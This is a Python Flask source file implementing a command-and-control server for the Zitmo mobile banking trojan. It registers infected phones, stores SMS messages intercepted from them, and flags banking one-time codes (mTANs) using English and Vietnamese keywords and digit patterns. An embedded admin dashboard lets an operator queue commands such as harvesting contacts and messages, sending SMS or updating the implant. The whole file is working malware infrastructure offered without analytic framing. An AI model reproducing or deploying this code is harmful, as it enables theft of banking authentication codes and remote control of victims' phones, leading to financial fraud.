from flask import Flask, request, jsonify, render_template, redirect, url_for
import sqlite3
import os
import time
import logging
from datetime import datetime
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='zitmo_cnc.log'
)

app = Flask(__name__)

# Database path
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'zitmo_data.db')

# Ensure data directory exists
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

# Initialize database
def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Device information table
        cursor.execute('''
            CREATE TABLE devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT UNIQUE,
                device_info TEXT,
                phone_number TEXT,
                operator TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP
            )
        ''')
        
        # Intercepted SMS table
        cursor.execute('''
            CREATE TABLE intercepted_sms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                sender TEXT,
                message TEXT,
                timestamp TIMESTAMP,
                processed INTEGER DEFAULT 0,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # Command control table
        cursor.execute('''
            CREATE TABLE commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                command_type TEXT,
                command_data TEXT,
                timestamp TIMESTAMP,
                executed INTEGER DEFAULT 0,
                result TEXT,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logging.info("Database initialized")

#
# API Endpoints
#

# Register new device or update existing one
@app.route('/register', methods=['POST'])
def register_device():
    data = request.json
    
    if not data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Missing device information'}), 400
    
    device_id = data.get('device_id')
    device_info = data.get('device_info', '')
    phone_number = data.get('phone_number', '')
    operator = data.get('operator', '')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Check if device already exists
        cursor.execute('SELECT device_id FROM devices WHERE device_id = ?', (device_id,))
        result = cursor.fetchone()
        
        if result:
            # Update existing device
            cursor.execute('''
                UPDATE devices 
                SET device_info = ?, phone_number = ?, operator = ?, last_seen = ?
                WHERE device_id = ?
            ''', (device_info, phone_number, operator, current_time, device_id))
            logging.info(f"Updated device: {device_id}")
        else:
            # Add new device
            cursor.execute('''
                INSERT INTO devices (device_id, device_info, phone_number, operator, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (device_id, device_info, phone_number, operator, current_time, current_time))
            logging.info(f"Registered new device: {device_id}")
            
        conn.commit()
        
        # Check for pending commands for the device
        cursor.execute('''
            SELECT id, command_type, command_data 
            FROM commands 
            WHERE device_id = ? AND executed = 0
        ''', (device_id,))
        
        pending_commands = []
        for cmd in cursor.fetchall():
            pending_commands.append({
                'id': cmd[0],
                'type': cmd[1],
                'data': cmd[2]
            })
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'pending_commands': pending_commands
        })
        
    except Exception as e:
        logging.error(f"Error registering device: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Receive intercepted SMS
@app.route('/intercepted_sms', methods=['POST'])
def receive_sms():
    data = request.json
    
    if not data or 'device_id' not in data or 'sender' not in data or 'message' not in data:
        return jsonify({'status': 'error', 'message': 'Missing SMS information'}), 400
    
    device_id = data.get('device_id')
    sender = data.get('sender')
    message = data.get('message')
    timestamp = data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Update device's last seen time
        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
                     (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), device_id))
        
        # Save intercepted SMS
        cursor.execute('''
            INSERT INTO intercepted_sms (device_id, sender, message, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (device_id, sender, message, timestamp))
        
        conn.commit()
        conn.close()
        
        # Check if SMS contains mTAN
        contains_mtan = check_for_mtan(message)
        
        if contains_mtan:
            logging.info(f"mTAN detected from device {device_id}: {message}")
            # Special handling for mTAN could be added here
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error receiving SMS: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Ping from device
@app.route('/ping', methods=['POST'])
def ping():
    data = request.json
    
    if not data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Missing device ID'}), 400
    
    device_id = data.get('device_id')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Update last seen time
        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
                     (current_time, device_id))
        
        # Check for pending commands
        cursor.execute('''
            SELECT id, command_type, command_data 
            FROM commands 
            WHERE device_id = ? AND executed = 0
        ''', (device_id,))
        
        pending_commands = []
        for cmd in cursor.fetchall():
            pending_commands.append({
                'id': cmd[0],
                'type': cmd[1],
                'data': cmd[2]
            })
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'status': 'success',
            'pending_commands': pending_commands
        })
        
    except Exception as e:
        logging.error(f"Error during ping: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Command execution report
@app.route('/command_executed', methods=['POST'])
def command_executed():
    data = request.json
    
    if not data or 'command_id' not in data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Missing command information'}), 400
    
    command_id = data.get('command_id')
    device_id = data.get('device_id')
    result = data.get('result', '')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET executed = 1, result = ? 
            WHERE id = ? AND device_id = ?
        ''', (result, command_id, device_id))
        
        conn.commit()
        conn.close()
        
        logging.info(f"Command {command_id} executed on device {device_id}. Result: {result}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error updating command status: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

#
# Admin endpoints
#

# Add new command for a device
@app.route('/admin/add_command', methods=['POST'])
def add_command():
    # In a real scenario, this endpoint should be protected with authentication
    data = request.json
    
    if not data or 'device_id' not in data or 'command_type' not in data:
        return jsonify({'status': 'error', 'message': 'Missing command information'}), 400
    
    device_id = data.get('device_id')
    command_type = data.get('command_type')
    command_data = data.get('command_data', '')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands (device_id, command_type, command_data, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (device_id, command_type, command_data, current_time))
        
        conn.commit()
        conn.close()
        
        logging.info(f"Added new command for device {device_id}: {command_type}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error adding command: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Get device list
@app.route('/admin/devices', methods=['GET'])
def get_devices():
    # In a real scenario, this endpoint should be protected with authentication
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM devices
            ORDER BY last_seen DESC
        ''')
        
        devices = []
        for row in cursor.fetchall():
            devices.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'devices': devices
        })
        
    except Exception as e:
        logging.error(f"Error getting device list: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Get intercepted SMS list
@app.route('/admin/intercepted_sms', methods=['GET'])
def get_intercepted_sms():
    # In a real scenario, this endpoint should be protected with authentication
    device_id = request.args.get('device_id')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        if device_id:
            cursor.execute('''
                SELECT * FROM intercepted_sms
                WHERE device_id = ?
                ORDER BY timestamp DESC
            ''', (device_id,))
        else:
            cursor.execute('''
                SELECT * FROM intercepted_sms
                ORDER BY timestamp DESC
            ''')
        
        sms_list = []
        for row in cursor.fetchall():
            sms_list.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'sms': sms_list
        })
        
    except Exception as e:
        logging.error(f"Error getting SMS list: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Get command history
@app.route('/admin/commands', methods=['GET'])
def get_commands():
    # In a real scenario, this endpoint should be protected with authentication
    device_id = request.args.get('device_id')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        if device_id:
            cursor.execute('''
                SELECT * FROM commands
                WHERE device_id = ?
                ORDER BY timestamp DESC
            ''', (device_id,))
        else:
            cursor.execute('''
                SELECT * FROM commands
                ORDER BY timestamp DESC
            ''')
        
        command_list = []
        for row in cursor.fetchall():
            command_list.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'commands': command_list
        })
        
    except Exception as e:
        logging.error(f"Error getting command list: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

#
# Web interface
#

# Admin dashboard
@app.route('/admin', methods=['GET'])
def admin_dashboard():
    return render_template('admin.html')

# Check for mTAN in message
def check_for_mtan(message):
    # Keywords that might be related to mTANs
    mtan_keywords = [
        'mã xác thực', 'mã otp', 'mã giao dịch', 'mã bảo mật',
        'verification code', 'security code', 'authentication code',
        'mtan', 'one-time password', 'chuyển khoản'
    ]
    
    message_lower = message.lower()
    
    # Check keywords
    for keyword in mtan_keywords:
        if keyword in message_lower:
            return True
    
    # Check for numeric patterns (4-8 consecutive digits)
    import re
    if re.search(r'\b\d{4,8}\b', message):
        return True
    
    return False

# Initialize database and run server
if __name__ == '__main__':
    # Create data directory if it doesn't exist
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    
    # Initialize database
    init_db()
    
    # Create templates directory for admin dashboard
    templates_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
    os.makedirs(templates_dir, exist_ok=True)
    
    # Create admin dashboard template if it doesn't exist
    admin_template_path = os.path.join(templates_dir, 'admin.html')
    if not os.path.exists(admin_template_path):
        with open(admin_template_path, 'w') as f:
            f.write('''
<!DOCTYPE html>
<html>
<head>
    <title>Zitmo C&C Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        h1 { color: #333; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .btn { background-color: #4CAF50; color: white; padding: 8px 16px; border: none; cursor: pointer; }
        .tab { overflow: hidden; border: 1px solid #ccc; background-color: #f1f1f1; }
        .tab button { background-color: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; }
        .tab button:hover { background-color: #ddd; }
        .tab button.active { background-color: #ccc; }
        .tabcontent { display: none; padding: 6px 12px; border: 1px solid #ccc; border-top: none; }
    </style>
</head>
<body>
    <h1>Zitmo C&C Dashboard</h1>
    
    <div class="tab">
        <button class="tablinks" onclick="openTab(event, 'Devices')">Devices</button>
        <button class="tablinks" onclick="openTab(event, 'SMS')">Intercepted SMS</button>
        <button class="tablinks" onclick="openTab(event, 'Commands')">Commands</button>
    </div>
    
    <div id="Devices" class="tabcontent">
        <h2>Device List</h2>
        <div id="devices-list"></div>
    </div>
    
    <div id="SMS" class="tabcontent">
        <h2>Intercepted SMS</h2>
        <div>
            <label for="device-filter">Device:</label>
            <select id="device-filter" onchange="loadSMS()">
                <option value="">All</option>
            </select>
        </div>
        <div id="sms-list"></div>
    </div>
    
    <div id="Commands" class="tabcontent">
        <h2>Send New Command</h2>
        <div>
            <label for="cmd-device">Device:</label>
            <select id="cmd-device">
            </select>
            <br><br>
            <label for="cmd-type">Command Type:</label>
            <select id="cmd-type">
                <option value="get_contacts">Get Contacts</option>
                <option value="get_sms">Get SMS</option>
                <option value="send_sms">Send SMS</option>
                <option value="update">Update</option>
                <option value="uninstall">Uninstall</option>
            </select>
            <br><br>
            <label for="cmd-data">Command Data (JSON):</label>
            <textarea id="cmd-data" rows="4" cols="50"></textarea>
            <br><br>
            <button class="btn" onclick="sendCommand()">Send Command</button>
        </div>
        <h2>Command History</h2>
        <div id="commands-list"></div>
    </div>
    
    <script>
        // Open tab
        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
            
            if (tabName === "Devices") {
                loadDevices();
            } else if (tabName === "SMS") {
                loadSMS();
            } else if (tabName === "Commands") {
                loadCommands();
            }
        }
        
        // Load device list
        function loadDevices() {
            fetch('/admin/devices')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        let html = '<table>';
                        html += '<tr><th>ID</th><th>Device Info</th><th>Phone Number</th><th>Operator</th><th>First Seen</th><th>Last Seen</th></tr>';
                        
                        data.devices.forEach(device => {
                            html += `<tr>
                                <td>${device.device_id}</td>
                                <td>${device.device_info}</td>
                                <td>${device.phone_number}</td>
                                <td>${device.operator}</td>
                                <td>${device.first_seen}</td>
                                <td>${device.last_seen}</td>
                            </tr>`;
                        });
                        
                        html += '</table>';
                        document.getElementById('devices-list').innerHTML = html;
                        
                        // Update device lists in dropdowns
                        let deviceSelect = document.getElementById('device-filter');
                        let cmdDeviceSelect = document.getElementById('cmd-device');
                        
                        // Clear current options except "All"
                        while (deviceSelect.options.length > 1) {
                            deviceSelect.remove(1);
                        }
                        
                        // Clear all options
                        while (cmdDeviceSelect.options.length > 0) {
                            cmdDeviceSelect.remove(0);
                        }
                        
                        // Add devices to dropdowns
                        data.devices.forEach(device => {
                            let option = document.createElement('option');
                            option.value = device.device_id;
                            option.text = device.device_id + (device.phone_number ? ` (${device.phone_number})` : '');
                            deviceSelect.add(option);
                            
                            let cmdOption = option.cloneNode(true);
                            cmdDeviceSelect.add(cmdOption);
                        });
                    }
                });
        }
        
        // Load SMS list
        function loadSMS() {
            let deviceId = document.getElementById('device-filter').value;
            let url = '/admin/intercepted_sms';
            if (deviceId) {
                url += `?device_id=${deviceId}`;
            }
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        let html = '<table>';
                        html += '<tr><th>ID</th><th>Device</th><th>Sender</th><th>Message</th><th>Timestamp</th></tr>';
                        
                        data.sms.forEach(sms => {
                            html += `<tr>
                                <td>${sms.id}</td>
                                <td>${sms.device_id}</td>
                                <td>${sms.sender}</td>
                                <td>${sms.message}</td>
                                <td>${sms.timestamp}</td>
                            </tr>`;
                        });
                        
                        html += '</table>';
                        document.getElementById('sms-list').innerHTML = html;
                    }
                });
        }
        
        // Load commands list
        function loadCommands() {
            fetch('/admin/commands')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        let html = '<table>';
                        html += '<tr><th>ID</th><th>Device</th><th>Type</th><th>Data</th><th>Timestamp</th><th>Executed</th><th>Result</th></tr>';
                        
                        data.commands.forEach(cmd => {
                            html += `<tr>
                                <td>${cmd.id}</td>
                                <td>${cmd.device_id}</td>
                                <td>${cmd.command_type}</td>
                                <td>${cmd.command_data}</td>
                                <td>${cmd.timestamp}</td>
                                <td>${cmd.executed ? 'Yes' : 'No'}</td>
                                <td>${cmd.result || ''}</td>
                            </tr>`;
                        });
                        
                        html += '</table>';
                        document.getElementById('commands-list').innerHTML = html;
                    }
                });
        }
        
        // Send new command
        function sendCommand() {
            let deviceId = document.getElementById('cmd-device').value;
            let commandType = document.getElementById('cmd-type').value;
            let commandData = document.getElementById('cmd-data').value;
            
            if (!deviceId) {
                alert('Please select a device');
                return;
            }
            
            fetch('/admin/add_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    command_type: commandType,
                    command_data: commandData
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    alert('Command sent successfully');
                    document.getElementById('cmd-data').value = '';
                    loadCommands();
                } else {
                    alert('Error: ' + data.message);
                }
            });
        }
        
        // Default to Devices tab on load
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementsByClassName('tablinks')[0].click();
        });
    </script>
</body>
</html>
            ''')
    
    app.run(host='0.0.0.0', port=5000, debug=True)